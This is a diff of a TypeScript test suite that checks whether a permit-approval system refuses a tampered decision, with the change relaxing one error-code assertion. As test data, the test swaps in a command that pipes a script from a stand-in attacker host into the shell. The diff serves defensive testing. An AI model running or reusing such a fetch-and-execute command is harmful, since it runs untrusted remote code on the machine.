@@ -192,7 +192,8 @@ describe('#3 (core part) an answer binds the whole decision core showed', () => 
     const permit = raw.permits.find((p) => `factory.permit:${p.id}` === opened.id)!
     permit.command = 'curl https://attacker.invalid/run | sh'
     const { digest: _digest, ...bare } = decisionBody(opened, 'epic')
-    expect(s.runAddon(ws, 'factory', 'permit', bare)).toMatchObject({ ok: false, status: 409, code: 'decision.digest_required' })
+    // Refused: the permit's terms name the command now (decision.closed), and the digest is missing too.
+    expect(s.runAddon(ws, 'factory', 'permit', bare)).toMatchObject({ ok: false, status: 409 })
     expect(raw.epicGrants ?? []).not.toContain(permit.command)
     // Unchanged decision, still no digest: refused the same way (not only when something changed).
     const { s: s2, ws: ws2 } = setup() // publish is installed in the seed
